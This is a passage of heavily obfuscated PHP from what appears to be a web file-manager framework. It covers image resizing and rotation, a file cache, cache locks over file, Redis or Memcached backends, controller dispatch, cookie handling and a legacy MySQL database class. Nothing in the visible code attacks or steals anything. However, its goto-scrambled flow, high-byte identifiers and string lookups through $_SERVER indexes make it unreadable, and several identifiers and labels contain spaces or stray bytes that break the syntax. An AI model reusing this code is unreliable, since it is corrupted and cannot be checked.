$BÒç·ãŞì¢, $aí£Š¥˜õ, $d„óåŒ‹à±); } } else { $E·‘Ëø£‡ƒ = ImageCreate($aØ·Á–³‹, $BÒç·ãŞì¢); imageCopyResized($E·‘Ëø£‡ƒ, $c…‰„¿„², $c¥‘íé¾œ, $E«‡Æİ†¦È, $fÎ¹¿‹Ÿâ¶, $a…àìÜ‚¬‹, $aØ·Á–³‹, $BÒç·ãŞì¢, $aí£Š¥˜õ, $d„óåŒ‹à±); } return $E·‘Ëø£‡ƒ; } public function imgRotate($AÛÑ “èî, $F»‡ºã …¦) { goto d‹ ©Ø©´; d©šé‘Ä„ç: return $FùÎ»¸Ù¥®; goto dÑ½Ç²‹ŒÏ; d‹ ©Ø©´: if (!$this->im || $F»‡ºã …¦ % 360 === 0 || !function_exists($_SERVER[°Óó£ÌİóèÅ][1296])) { return !1; } $c¹°ëÍ…æ = imageRotate($this->im, 360 - $F»‡ºã …¦, 0); $FùÎ»¸Ù¥® = !1; goto aæ†íèÔ³å; aæ†íèÔ³å: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $FùÎ»¸Ù¥® = imagegif($c¹°ëÍ…æ, $AÛÑ “èî); break; case IMAGETYPE_JPEG: $FùÎ»¸Ù¥® = imagejpeg($c¹°ëÍ…æ, $AÛÑ “èî, 100); break; case IMAGETYPE_PNG: $FùÎ»¸Ù¥® = imagePNG($c¹°ëÍ…æ, $AÛÑ “èî); break; default: break; } imageDestroy($c¹°ëÍ…æ); imageDestroy($this->im); goto d©šé‘Ä„ç; dÑ½Ç²‹ŒÏ: } function echoImage($dâì­©»¿, $CÕÓœÙ›±ø) { goto A±”ßÛ½î; D†ª ÆËÒ‘: imageDestroy($this->im); return $cô¸ŒÀí‰Â; goto AÓìˆ«ØçÑ; e¬¾×İäÚ: $cô¸ŒÀí‰Â = !1; switch ($this->echoType) { case $d¯áù÷ì¶Ø[1297]: $cô¸ŒÀí‰Â = imagePNG($dâì­©»¿); break; case $d¯áù÷ì¶Ø[172]: $cô¸ŒÀí‰Â = imagePNG($dâì­©»¿, $CÕÓœÙ›±ø); break; } imageDestroy($dâì­©»¿); goto D†ª ÆËÒ‘; A±”ßÛ½î: $d¯áù÷ì¶Ø =& $_SERVER[°Óó£ÌİóèÅ]; if (!$dâì­©»¿) { return !1; } ob_get_clean(); goto e¬¾×İäÚ; AÓìˆ«ØçÑ: } } goto eç¹‹¨’’÷; B°È˜™âÍÛ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Fñâ¡ŠÈÇ», $cÜÄÂÎ–‰Û) { $A°›Ã¡Øçê =& $_SERVER[°Óó£ÌİóèÅ]; $this->cachePath = $Fñâ¡ŠÈÇ»[$A°›Ã¡Øçê[84]]; $this->prefix = $A°›Ã¡Øçê[537]; $this->cacheTime = $cÜÄÂÎ–‰Û; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($DİÄˆŸÀĞ) { $B£¨æç·¨× =& $_SERVER[°Óó£ÌİóèÅ]; $DİÄˆŸÀĞ = str_replace(array($B£¨æç·¨×[503], $B£¨æç·¨×[102], $B£¨æç·¨×[78]), $B£¨æç·¨×[538], $DİÄˆŸÀĞ); return $this->cachePath . $B£¨æç·¨×[539] . $DİÄˆŸÀĞ . $B£¨æç·¨×[540]; } public function set($Aà­—œ…Ô¦, $FĞºËÓ¦Æ, $e®íÍƒê‚ñ = false) { $B£µ…×…êš = $this->getFile($Aà­—œ…Ô¦); if (file_put_contents($B£µ…×…êš, $this->prefix . $FĞºËÓ¦Æ, LOCK_EX)) { return !0; } @unlink($B£µ…×…êš); return !1; } public function get($aÚ‘Ôõ‘°º) { $EğåŞÑ‘Ã = $this->getFile($aÚ‘Ôõ‘°º); if (file_exists($EğåŞÑ‘Ã) && filemtime($EğåŞÑ‘Ã) < time() - $this->cacheTime) { @unlink($EğåŞÑ‘Ã); return !1; } $d°Çˆ¦•ãí = @file_get_contents($EğåŞÑ‘Ã); return substr($d°Çˆ¦•ãí, strlen($this->prefix)); } public function remove($cĞ…±¿ç¢¶) { $F—µÁ©’ = $this->getFile($cĞ…±¿ç¢¶); return @unlink($F—µÁ©’); } public function deleteAll() { $fˆÖòÍ£Ÿİ =& $_SERVER[°Óó£ÌİóèÅ]; $DÇ®·†ƒ¿Ä = scandir($this->cachePath); foreach ($DÇ®·†ƒ¿Ä as $AÖö§ÙÓ‘£) { $D”Ë´†™îÕ = $this->cachePath . $AÖö§ÙÓ‘£; if (strpos($D”Ë´†™îÕ, $fˆÖòÍ£Ÿİ[540]) && strpos($D”Ë´†™îÕ, $fˆÖòÍ£Ÿİ[541])) { @unlink($D”Ë´†™îÕ); } } } public function clearTimeout() { $fÌ’ä“œ¥« =& $_SERVER[°Óó£ÌİóèÅ]; $DƒÔŒÕÆ® = scandir($this->cachePath); foreach ($DƒÔŒÕÆ® as $EğÖƒùÓŸ—) { $F“¶Ê……àù = $this->cachePath . $EğÖƒùÓŸ—; if (strpos($F“¶Ê……àù, $fÌ’ä“œ¥«[540]) && strpos($F“¶Ê……àù, $fÌ’ä“œ¥«[541]) && filemtime($F“¶Ê……àù) < time() - $this->cacheTime) { @unlink($F“¶Ê……àù); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $lockItem = array(); public static function init() { goto aÒœİ Ö; eÇŠ½»ˆ„: switch ($Eì¤»¶µŞ´[$B‘›³òÎÀ™[530]]) { case $B‘›³òÎÀ™[533]: self::$handle = new CacheLockRedis(); break; case $B‘›³òÎÀ™[534]: self::$handle = new CacheLockMemcached(); break; case $B‘›³òÎÀ™[17]: self::$handle = new CacheLockDatabase(); break; case $B‘›³òÎÀ™[172]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto Dí±¢¦Ê; aÒœİ Ö: $B‘›³òÎÀ™ =& $_SERVER[°Óó£ÌİóèÅ]; if (self::$handle) { return self::$handle; } $Eì¤»¶µŞ´ = $GLOBALS[$B‘›³òÎÀ™[6]][$B‘›³òÎÀ™[348]]; goto B‡äÆ³¶óÒ; B‡äÆ³¶óÒ: self::$timeout = $Eì¤»¶µŞ´[$B‘›³òÎÀ™[542]] ? $Eì¤»¶µŞ´[$B‘›³òÎÀ™[542]] : 10; $E¹†®÷ê = $GLOBALS[$B‘›³òÎÀ™[6]][$B‘›³òÎÀ™[17]][$B‘›³òÎÀ™[498]]; if ($Eì¤»¶µŞ´[$B‘›³òÎÀ™[530]] == $B‘›³òÎÀ™[17] && $E¹†®÷ê == $B‘›³òÎÀ™[9]) { $Eì¤»¶µŞ´[$B‘›³òÎÀ™[530]] = $B‘›³òÎÀ™[172]; } goto eÇŠ½»ˆ„; Dí±¢¦Ê: } private static function key($BÃå¡ƒŞ¿) { return $_SERVER[°Óó£ÌİóèÅ][543] . Cache::key($BÃå¡ƒŞ¿); } public static function initReset() { self::$handle = !1; } public static function lockGlobal($Aø‘áº—Å, $CÆ—ªÔö³×) { return self::lock($Aø‘áº—Å, $CÆ—ªÔö³×, !0); } public static function lock($e¾ËíŒ…¶Ï, $b›‘å÷·èÌ = false, $DŒ¨ôŠ˜î› = false) { goto DçÆ’×„Šõ; c’—Óëó¥: $c¼Èã— İÚ = timeFloat(); $b›‘å÷·èÌ = $b›‘å÷·èÌ ? $b›‘å÷·èÌ : self::$timeout; $b³Ãôë³‚ß = $FíŠß„‰²->lock($e¾ËíŒ…¶Ï, $b›‘å÷·èÌ); goto EåéÔéÄè; EåéÔéÄè: if (!$b³Ãôë³‚ß) { write_log($B†™­‚ØØÑ[544] . (timeFloat() - $c¼Èã— İÚ) . $B†™­‚ØØÑ[76] . get_caller_msg(), $B†™­‚ØØÑ[545]); show_json("\x4c\157\x63\153\x20\x61\143\164\x69\x6f\156\x3a\40{$e¾ËíŒ…¶Ï}\40\164\x69\155\145\157\165\x74\x2c\x6f\x76\145\x72\x20{$b›‘å÷·èÌ}\40\163", !1); } if (!$DŒ¨ôŠ˜î›) { self::$lockItem[$e¾ËíŒ…¶Ï] = !0; } return $b³Ãôë³‚ß; goto aŞ‰²òç¡˜; DçÆ’×„Šõ: $B†™­‚ØØÑ =& $_SERVER[°Óó£ÌİóèÅ]; $FíŠß„‰² = self::init(); $e¾ËíŒ…¶Ï = self::key($e¾ËíŒ…¶Ï); goto c’—Óëó¥; aŞ‰²òç¡˜: } public static function unlock($d˜……öéËÜ) { $d˜……öéËÜ = self::key($d˜……öéËÜ); self::$lockItem[$d˜……öéËÜ] = null; return self::init()->unlock($d˜……öéËÜ); } public static function unlockRuntime() { $C‰éáÏ¾İ = self::$lockItem; $A‹§ß­ñÃ‰ = self::init(); foreach ($C‰éáÏ¾İ as $Fˆì¸±§âÅ => $a•ŠáŒ¾é¿) { if ($a•ŠáŒ¾é¿) { $A‹§ß­ñÃ‰->unlock($Fˆì¸±§âÅ); } } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto b©ÚÂàíØ; aĞÕ¡³: function Action($Fà‚ ãÖ™Ñ = '') { goto e®”•†àÖÍ; f¢‡Ò´´ä: $E¦²Ô¨É¾Î = strtolower($C¬§’‰“Ş); if (isset($Cœ¨â´Ôö­[$E¦²Ô¨É¾Î])) { return $Cœ¨â´Ôö­[$E¦²Ô¨É¾Î]; } if (is_file($EàíÎ³ë¸Ã)) { include_once $EàíÎ³ë¸Ã; } goto c£ê‚á¦—; e®”•†àÖÍ: $f†»ƒç =& $_SERVER[³ªí]; static $Cœ¨â´Ôö­ = array(); $Fà‚ ãÖ™Ñ = trim(str_replace($f†»ƒç[2], $f†»ƒç[3], $Fà‚ ãÖ™Ñ), $f†»ƒç[2]); goto eå‡æ½“ª; eå‡æ½“ª: $Eêì¤ÜŠ‚ = explode($f†»ƒç[3], $Fà‚ ãÖ™Ñ); $c‡éõ¡°Ìõ = strtolower($Eêì¤ÜŠ‚[0]); if (substr($c‡éõ¡°Ìõ, -6) == $f†»ƒç[4]) { $Fà‚ ãÖ™Ñ = substr($Eêì¤ÜŠ‚[0], 0, -6); $C¬§’‰“Ş = $Fà‚ ãÖ™Ñ . $f†»ƒç[5]; $EàíÎ³ë¸Ã = $f†»ƒç[6]; if (isset($Eêì¤ÜŠ‚[1]) && substr(strtolower($Eêì¤ÜŠ‚[1]), -5) == $f†»ƒç[7]) { $C¬§’‰“Ş = $Fà‚ ãÖ™Ñ . $Eêì¤ÜŠ‚[1]; $EàíÎ³ë¸Ã = $f†»ƒç[8] . $Eêì¤ÜŠ‚[1] . $f†»ƒç[9]; } else { if (count($Eêì¤ÜŠ‚) == 3) { $C¬§’‰“Ş = $Fà‚ ãÖ™Ñ . $Eêì¤ÜŠ‚[1] . $Eêì¤ÜŠ‚[2]; $EàíÎ³ë¸Ã = $f†»ƒç[10] . $Eêì¤ÜŠ‚[1] . $f†»ƒç[11] . $Eêì¤ÜŠ‚[2] . $f†»ƒç[9]; } } $EàíÎ³ë¸Ã = PLUGIN_DIR . $Fà‚ ãÖ™Ñ . $f†»ƒç[2] . $EàíÎ³ë¸Ã; } else { if (substr($c‡éõ¡°Ìõ, -5) == $f†»ƒç[7]) { $Fà‚ ãÖ™Ñ = substr($Eêì¤ÜŠ‚[0], 0, -5); return Model($Fà‚ ãÖ™Ñ); } else { $C¬§’‰“Ş = $Eêì¤ÜŠ‚[0] . $Eêì¤ÜŠ‚[1]; $EàíÎ³ë¸Ã = CONTROLLER_DIR . $Eêì¤ÜŠ‚[0] . $f†»ƒç[2] . $Eêì¤ÜŠ‚[1] . $f†»ƒç[12]; } } goto f¢‡Ò´´ä; c£ê‚á¦—: if (!class_exists($C¬§’‰“Ş)) { return actionCallError("\133{$Fà‚ ãÖ™Ñ}\40\75\76\40{$C¬§’‰“Ş}\x5d\40\143\154\x61\163\163\x20\156\157\164\x20\x65\170\x69\x73\x74\x73\41"); } $Cœ¨â´Ôö­[$E¦²Ô¨É¾Î] = new $C¬§’‰“Ş(); return $Cœ¨â´Ôö­[$E¦²Ô¨É¾Î]; goto EÈ‰é…õÁ…; EÈ‰é…õÁ…: } function ActionApply($f‹Í¡æÀ«®, $f¸ ‚¸äõ¿ = array()) { goto B¥³ËŞ —ç; B¥³ËŞ —ç: if (is_array($f‹Í¡æÀ«®)) { return call_user_func_array($f‹Í¡æÀ«®, $f¸ ‚¸äõ¿); } if (function_exists($f‹Í¡æÀ«®)) { return call_user_func_array($f‹Í¡æÀ«®, $f¸ ‚¸äõ¿); } $bÁÁ¶ê«ò¢ = strrpos($f‹Í¡æÀ«®, $_SERVER[³ªí][3]); goto C®á¹»Ø; C®á¹»Ø: $DŒ”åÅõº¤ = substr($f‹Í¡æÀ«®, 0, $bÁÁ¶ê«ò¢); $B’é˜®ÑÀ = substr($f‹Í¡æÀ«®, $bÁÁ¶ê«ò¢ + 1); $eˆØˆˆÂ“‡ = Action($DŒ”åÅõº¤); goto bÍÔªâ’­¾; bÍÔªâ’­¾: if (!method_exists($eˆØˆˆÂ“‡, $B’é˜®ÑÀ)) { return actionCallError("{$f‹Í¡æÀ«®}\x20\x6d\x65\x74\150\x6f\x64\40\156\x6f\164\40\145\x78\x69\163\x74\x73\41"); } $d¥‚ç‡¢Í = call_user_func_array(array($eˆØˆˆÂ“‡, $B’é˜®ÑÀ), $f¸ ‚¸äõ¿); return $d¥‚ç‡¢Í; goto aâ„öñÕÆ«; aâ„öñÕÆ«: } function actionCallError($cÛä¤ƒ”Ğˆ) { $aŞ±øòÑŒ° =& $_SERVER[³ªí]; $A™å¤‚¤ô† = json_encode_force(array($aŞ±øòÑŒ°[13] => this_url(), $aŞ±øòÑŒ°[14] => $GLOBALS[$aŞ±øòÑŒ°[14]])); $A™å¤‚¤ô† = str_replace(array($aŞ±øòÑŒ°[15]), array($aŞ±øòÑŒ°[2]), $A™å¤‚¤ô†); return write_log($cÛä¤ƒ”Ğˆ . $aŞ±øòÑŒ°[16] . $A™å¤‚¤ô†, $aŞ±øòÑŒ°[17]); } goto bË…ŞÑóéò; b©ÚÂàíØ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $E×±¨«Î—Á =& $_SERVER[°Óó£ÌİóèÅ]; $EàÚó¡¸½„ = $GLOBALS[$E×±¨«Î—Á[6]][$E×±¨«Î—Á[348]]; self::$cachePath = $EàÚó¡¸½„[$E×±¨«Î—Á[172]][$E×±¨«Î—Á[84]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bøà‚–İ×¦, $FÏ˜¿ÔÒ¶ = 0) { goto BØÜĞïËã; BØÜĞïËã: $aš“Ø™­Š =& $_SERVER[°Óó£ÌİóèÅ]; $b™á—°æºò = microtime(!0); $c¡Ô…¿âãå = $b™á—°æºò + $FÏ˜¿ÔÒ¶ + 0.0001; goto cİÓ§Èô³„; cİÓ§Èô³„: $DœÂ÷¨Ÿ¤¯ = rtrim(self::$cachePath, $aš“Ø™­Š[8]) . $aš“Ø™­Š[546] . md5($bøà‚–İ×¦) . $aš“Ø™­Š[547]; if (file_exists($DœÂ÷¨Ÿ¤¯) && filemtime($DœÂ÷¨Ÿ¤¯) && filemtime($DœÂ÷¨Ÿ¤¯) < time() - 10) { @unlink($DœÂ÷¨Ÿ¤¯); } do { if (file_exists($DœÂ÷¨Ÿ¤¯)) { cacheLockWait(); continue; } $dºïËÅ– = fopen($DœÂ÷¨Ÿ¤¯, $aš“Ø™­Š[548]); $b¯µèÓ£ø = flock($dºïËÅ–, LOCK_EX | LOCK_NB); self::$caches[$bøà‚–İ×¦] = array($aš“Ø™­Š[549] => $dºïËÅ–, $aš“Ø™­Š[172] => $DœÂ÷¨Ÿ¤¯); fwrite($dºïËÅ–, $c¡Ô…¿âãå); clearstatcache(); if ($dºïËÅ– && $b¯µèÓ£ø) { return !0; } cacheLockWait(); } while (microtime(!0) < $c¡Ô…¿âãå); goto dçÒ£§İß; dçÒ£§İß: $this->unlock($bøà‚–İ×¦); return !1; goto dÔÍ¯Œ±ëå; dÔÍ¯Œ±ëå: } public function unlock($f‰ŸÓöÉ×) { goto Fî—İ„Å‘Æ; Fî—İ„Å‘Æ: $e°ˆ‘Éêãà =& $_SERVER[°Óó£ÌİóèÅ]; $CÉÈ˜Ûïº· = self::$caches[$f‰ŸÓöÉ×]; if (!$CÉÈ˜Ûïº·) { return; } goto c èŸÊê»; c èŸÊê»: @flock($CÉÈ˜Ûïº·[$e°ˆ‘Éêãà[549]], LOCK_UN); @fclose($CÉÈ˜Ûïº·[$e°ˆ‘Éêãà[549]]); @unlink($CÉÈ˜Ûïº·[$e°ˆ‘Éêãà[172]]); goto d¨¶İîÚÛ; d¨¶İîÚÛ: unset(self::$caches[$f‰ŸÓöÉ×]); goto C¤‡¢×ö§Ï; C¤‡¢×ö§Ï: } } class CacheLockRedis { public function lock($B³ŒƒùÊÊÓ, $d‡¥æÄÒÀØ = 10) { $F¨ãÏÂöÉ = Cache::init(); $BÑÉàÕÃõ = microtime(!0) + $d‡¥æÄÒÀØ; while (microtime(!0) < $BÑÉàÕÃõ) { $eˆÌÜôÇŞŸ = $F¨ãÏÂöÉ->get($B³ŒƒùÊÊÓ); if (!$eˆÌÜôÇŞŸ) { $E²«¬°çÑÅ = $F¨ãÏÂöÉ->setLock($B³ŒƒùÊÊÓ, $BÑÉàÕÃõ, $d‡¥æÄÒÀØ); if ($E²«¬°çÑÅ) { return !0; } } else { if ($eˆÌÜôÇŞŸ < microtime(!0)) { $F¨ãÏÂöÉ->set($B³ŒƒùÊÊÓ, $BÑÉàÕÃõ, $BÑÉàÕÃõ); if ($F¨ãÏÂöÉ->get($B³ŒƒùÊÊÓ) === $eˆÌÜôÇŞŸ) { return !0; } } } cacheLockWait(); } return !1; } public function unlock($BÁîó¿ÌÓ) { $Bƒ¼åŠ±ğ = Cache::init(); $Bƒ¼åŠ±ğ->remove($BÁîó¿ÌÓ); } } class CacheLockMemcached { public function lock($Bùâ”ÙÜø, $B„»– Ôæ = 0) { $eÜïòéµ…´ = Cache::init(); $aÉ¦éÕÃåê = microtime(!0) + $B„»– Ôæ; while (microtime(!0) < $aÉ¦éÕÃåê) { $b¾¾µæ®Ùß = $eÜïòéµ…´->get($Bùâ”ÙÜø); if (!$b¾¾µæ®Ùß || $b¾¾µæ®Ùß < microtime(!0)) { $e­±²ùõ” = $eÜïòéµ…´->handle->add($Bùâ”ÙÜø, $aÉ¦éÕÃåê, $B„»– Ôæ); if ($e­±²ùõ”) { return !0; } } cacheLockWait(); } return !1; } public function unlock($F°ñÉ›áÙ) { $dµ¾ëÊïÚñ = Cache::init(); $dµ¾ëÊïÚñ->remove($F°ñÉ›áÙ); } } goto dò£³’‰—É; EÖ¢ïö‚õ®: define($_SERVER[°Óó£ÌİóèÅ][239], 3); define($_SERVER[°Óó£ÌİóèÅ][240], 1); define($_SERVER[°Óó£ÌİóèÅ][241], 0); goto F’§…ºèĞ¿; a‘ÊÂğÃŒ¬: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($FãÌ¾Î…• = '', $aìÄºõ‹¨ğ = 0) { if (is_string($FãÌ¾Î…•) && $FãÌ¾Î…• != $_SERVER[°Óó£ÌİóèÅ][33]) { $this->prefix = $FãÌ¾Î…•; } if (is_numeric($aìÄºõ‹¨ğ) && $aìÄºõ‹¨ğ > 0) { $this->expire = $aìÄºõ‹¨ğ; } } public static function getInstance() { static $añËŠƒÒ†; if ($añËŠƒÒ† === null) { $añËŠƒÒ† = new self(); } return $añËŠƒÒ†; } private static $sameCookieSet = array(); public static function set($eÕºÏ÷„­“, $DªÛàÎáë‡, $dğ½—ÉÀÈ = 0, $eÓ°êŒÎâÂ = false, $a‚ë¿†è = false) { $fî•ã¤‡½ò =& $_SERVER[°Óó£ÌİóèÅ]; if (!$dğ½—ÉÀÈ) { $dğ½—ÉÀÈ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$eÕºÏ÷„­“]) && self::$sameCookieSet[$eÕºÏ÷„­“] == $DªÛàÎáë‡ . $dğ½—ÉÀÈ) { return; } self::$sameCookieSet[$eÕºÏ÷„­“] = $DªÛàÎáë‡ . $dğ½—ÉÀÈ; if (!$a‚ë¿†è) { $a‚ë¿†è = str_replace(HOST, $fî•ã¤‡½ò[33], APP_HOST); $a‚ë¿†è = $fî•ã¤‡½ò[8] . trim($a‚ë¿†è, $fî•ã¤‡½ò[8]); } setcookie($eÕºÏ÷„­“, $DªÛàÎáë‡, time() + $dğ½—ÉÀÈ, $a‚ë¿†è, !1, !1, $eÓ°êŒÎâÂ); } public static function setSafe($D­ëëŞòÖö, $AñŠàöšÂŒ, $FÃÌ‹º®´¸ = 0) { self::set($D­ëëŞòÖö, $AñŠàöšÂŒ, $FÃÌ‹º®´¸, !0); } public static function get($Cİ½î¹’­Î) { return isset($_COOKIE[$Cİ½î¹’­Î]) ? $_COOKIE[$Cİ½î¹’­Î] : !1; } public static function remove($AÉí•…¬ØÓ, $Eî”ï½È­ = false) { unset($_COOKIE[$AÉí•…¬ØÓ]); self::set($AÉí•…¬ØÓ, $_SERVER[°Óó£ÌİóèÅ][33], 1, $Eî”ï½È­); } } class DbMysql extends Db { public function __construct($e‹¯ĞÄ•¢ = '') { $bç®°´ÄôÕ =& $_SERVER[°Óó£ÌİóèÅ]; if (!extension_loaded($bç®°´ÄôÕ[481])) { think_exception(think_lang($bç®°´ÄôÕ[10]) . $bç®°´ÄôÕ[564]); } if (!empty($e‹¯ĞÄ•¢)) { $this->config = $e‹¯ĞÄ•¢; if (empty($this->config[$bç®°´ÄôÕ[13]])) { $this->config[$bç®°´ÄôÕ[13]] = $bç®°´ÄôÕ[33]; } } } public function connect($C¦Üšõ ç² = '', $C¬é”‡¥¿õ = 0, $B¡ˆ‰©”óÀ = false) { $EôØÛÄ°‰Ù =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($this->linkID[$C¬é”‡¥¿õ])) { goto dÖÑïàÁ™§; dÖÑïàÁ™§: if (empty($C¦Üšõ ç²)) { $C¦Üšõ ç² = $this->config; } $f…ÔğåÖ¦ = $C¦Üšõ ç²[$EôØÛÄ°‰Ù[565]] . ($C¦Üšõ ç²[$EôØÛÄ°‰Ù[566]] ? "\72{$C¦Üšõ ç²[$EôØÛÄ°‰Ù[566]]}" : $EôØÛÄ°‰Ù[33]); $açŒê²Ò» = !empty($C¦Üšõ ç²[$EôØÛÄ°‰Ù[13]][$EôØÛÄ°‰Ù[14]]) ? $C¦Üšõ ç²[$EôØÛÄ°‰Ù[13]][$EôØÛÄ°‰Ù[14]] : $this->pconnect; goto FğÎ›“íÑ; cáâÉïß£¹: mysql_query($EôØÛÄ°‰Ù[569] . think_config($EôØÛÄ°‰Ù[570]) . $EôØÛÄ°‰Ù[55], $this->linkID[$C¬é”‡¥¿õ]); if ($B†÷Û’…Ñ® > $EôØÛÄ°‰Ù[571]) { mysql_query($EôØÛÄ°‰Ù[572], $this->linkID[$C¬é”‡¥¿õ]); } $this->connected = !0; goto b¨¤•îàåæ; b¨¤•îàåæ: if (1 != think_config($EôØÛÄ°‰Ù[18])) { unset($this->config); } goto C‰¦µã¥§; FğÎ›“íÑ: if ($açŒê²Ò») { $this->linkID[$C¬é”‡¥¿õ] = mysql_pconnect($f…ÔğåÖ¦, $C¦Üšõ ç²[$EôØÛÄ°‰Ù[567]], $C¦Üšõ ç²[$EôØÛÄ°‰Ù[568]], 131072); } else { $this->linkID[$C¬é”‡¥¿õ] = mysql_connect($f…ÔğåÖ¦, $C¦Üšõ ç²[$EôØÛÄ°‰Ù[567]], $C¦Üšõ ç²[$EôØÛÄ°‰Ù[568]], !0, 131072); } if (!$this->linkID[$C¬é”‡¥¿õ] || !empty($C¦Üšõ ç²[$EôØÛÄ°‰Ù[17]]) && !mysql_select_db($C¦Üšõ ç²[$EôØÛÄ°‰Ù[17]], $this->linkID[$C¬é”‡¥¿õ])) { think_exception(mysql_error()); } $B†÷Û’…Ñ® = mysql_get_server_info($this->linkID[$C¬é”‡¥¿õ]); goto cáâÉïß£¹; C‰¦µã¥§: } return $this->linkID[$C¬é”‡¥¿õ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($FÌÃÕ«æË) { goto e…Š­æê„; AÂ´›–Ôµ²: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto fÏÑŒš¹‰—; b˜Ğ²ãù“´: if (!$this->_linkID) { return !1; } $this->queryStr = $FÌÃÕ«æË; if ($this->queryID) { $this->free(); } goto C«é‘•î‘; C«é‘•î‘: think_action_status($a„ŒÙ‹Ğ±œ[19], 1); think_status($a„ŒÙ‹Ğ±œ[20]); $this->queryID = mysql_query($FÌÃÕ«æË, $this->_linkID); goto AÂ´›–Ôµ²; e…Š­æê„: $a„ŒÙ‹Ğ±œ =& $_SERVER[°Óó£ÌİóèÅ]; if (0 === stripos($FÌÃÕ«æË, $a„ŒÙ‹Ğ±œ[263])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto b˜Ğ²ãù“´; fÏÑŒš¹‰—: } public function execute($Díƒˆ‹ë½) { goto DÃ› ªÅ¥¢; DÃ› ªÅ¥¢: $d­È­¢ÜÛ =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FâµÖïèÑ; FâµÖïèÑ: $this->queryStr = $Díƒˆ‹ë½; if ($this->queryID) { $this->free(); } think_action_status($d­È­¢ÜÛ[21], 1); goto FÄÜ‚ñ¼…; FÄÜ‚ñ¼…: think_status($d­È­¢ÜÛ[20]); $DÛÛìêÁÓÅ = mysql_query($Díƒˆ‹ë½, $this->_linkID); $this->debug(); goto B¶¦ë”Ÿğ‰; B¶¦ë”Ÿğ‰: if (!1 === $DÛÛìêÁÓÅ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto a©¬¯ğˆâ¸; a©¬¯ğˆâ¸: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[°Óó£ÌİóèÅ][573], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AØè—´áÉô = mysql_query($_SERVER[°Óó£ÌİóèÅ][574], $this->_linkID); $this->transTimes = 0; if (!$AØè—´áÉô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B³”‹¾©ˆÛ = mysql_query($_SERVER[°Óó£ÌİóèÅ][575], $this->_linkID); $this->transTimes = 0; if (!$B³”‹¾©ˆÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $CÔ³é¢Âº = array(); if ($this->numRows > 0) { while ($c˜±½¥²á† = mysql_fetch_assoc($this->queryID)) { $CÔ³é¢Âº[] = $c˜±½¥²á†; } mysql_data_seek($this->queryID, 0); } return $CÔ³é¢Âº; } public function getFields($AºÖ—Ë÷ªï) { $Aª‘Ìœ‹Ú“ =& $_SERVER[°Óó£ÌİóèÅ]; $F¥ÂÙ½Š¯ñ = $this->query($Aª‘Ìœ‹Ú“[576] . $this->parseKey($AºÖ—Ë÷ªï)); $EøÖõ·Â‡— = array(); if ($F¥ÂÙ½Š¯ñ) { foreach ($F¥ÂÙ½Š¯ñ as $FÛ˜¼ò¾Ë => $A¸ÅÕ‘ÅÉ) { $EøÖõ·Â‡—[$A¸ÅÕ‘ÅÉ[$Aª‘Ìœ‹Ú“[27]]] = array($Aª‘Ìœ‹Ú“[28] => $A¸ÅÕ‘ÅÉ[$Aª‘Ìœ‹Ú“[27]], $Aª‘Ìœ‹Ú“[29] => $A¸ÅÕ‘ÅÉ[$Aª‘Ìœ‹Ú“[30]], $Aª‘Ìœ‹Ú“[31] => (bool) (strtoupper($A¸ÅÕ‘ÅÉ[$Aª‘Ìœ‹Ú“[32]]) === $Aª‘Ìœ‹Ú“[577]), $Aª‘Ìœ‹Ú“[34] => $A¸ÅÕ‘ÅÉ[$Aª‘Ìœ‹Ú“[35]], $Aª‘Ìœ‹Ú“[36] => strtolower($A¸ÅÕ‘ÅÉ[$Aª‘Ìœ‹Ú“[37]]) == $Aª‘Ìœ‹Ú“[38], $Aª‘Ìœ‹Ú“[39] => strtolower($A¸ÅÕ‘ÅÉ[$Aª‘Ìœ‹Ú“[40]]) == $Aª‘Ìœ‹Ú“[41]); } } return $EøÖõ·Â‡—; } public function getTables($FÏ­ÀªËÑ“ = '') { $Fô‘âƒ¹¹Œ =& $_SERVER[°Óó£ÌİóèÅ]; if (!empty($FÏ­ÀªËÑ“)) { $c§“´±µ–ì = $Fô‘âƒ¹¹Œ[578] . $FÏ­ÀªËÑ“; } else { $c§“´±µ–ì = $Fô‘âƒ¹¹Œ[579]; } $CÕÕ·™™Ó¢ = $this->query($c§“´±µ–ì); $cİ«…§œï = array(); foreach ($CÕÕ·™™Ó¢ as $f¦‡††”Š¤ => $Aì‚¢©©›Ï) { $cİ«…§œï[$f¦‡††”Š¤] = current($Aì‚¢©©›Ï); } return $cİ«…§œï; } public function replace($B…«ÜÑœ¯, $aéµçÀÄã = array()) { $C‘™ÜŒ† =& $_SERVER[°Óó£ÌİóèÅ]; foreach ($B…«ÜÑœ¯ as $Eà¶ÍŒñ¥ => $c–´¢”¥é¦) { $D«Æ„µ¼Ÿ = $this->parseValue($c–´¢”¥é¦); if (is_scalar($D«Æ„µ¼Ÿ)) { $D¹ÎÀÔ–”[] = $D«Æ„µ¼Ÿ; $b‹±ØŒ¸Ïƒ[] = $this->parseKey($Eà¶ÍŒñ¥); } } $BìŒ¢©Õ¦¡ = $C‘™ÜŒ†[580] . $this->parseTable($aéµçÀÄã[$C‘™ÜŒ†[278]]) . $C‘™ÜŒ†[581] . implode($C‘™ÜŒ†[47], 